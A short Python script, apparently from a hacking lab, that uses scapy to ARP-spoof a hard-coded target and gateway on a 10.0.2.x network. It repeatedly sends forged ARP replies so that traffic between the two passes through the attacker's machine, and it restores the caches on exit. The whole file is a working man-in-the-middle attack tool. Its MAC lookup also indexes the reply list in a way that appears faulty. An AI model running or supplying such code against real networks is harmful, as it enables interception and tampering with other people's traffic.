#! /usr/bin/env python
import time
import scapy.all as scapy
import sys


def scan(ip):
    req_arp = scapy.ARP(pdst=ip)
    req_bdst = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    req_pck = req_bdst / req_arp
    result = scapy.srp(req_pck, timeout=1, verbose=False)[0]
    try:
        return result[1][0].hwsrc
    except IndexError:
        pass


def spoof(target, spf_ip):
    packet = scapy.ARP(op=2, pdst=target, hwdst=scan(target), psrc=spf_ip)
    scapy.send(packet, verbose=False)


def restore(target, spf_ip):
    packet = scapy.ARP(op=2, pdst=target, hwdst=scan(target), psrc=spf_ip, hwsrc=scan(spf_ip))
    scapy.send(packet, verbose=False, count=4)


count = 0
target1 = "10.0.2.4"
gateway = "10.0.2.1"

try:
    while True:
        spoof(target1, gateway)
        spoof(gateway, target1)
        count += 2
        print("\r Packet sent: "+str(count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print(" \n Exit and reset please Wait")
    restore(target1, gateway)
    restore(gateway, target1)

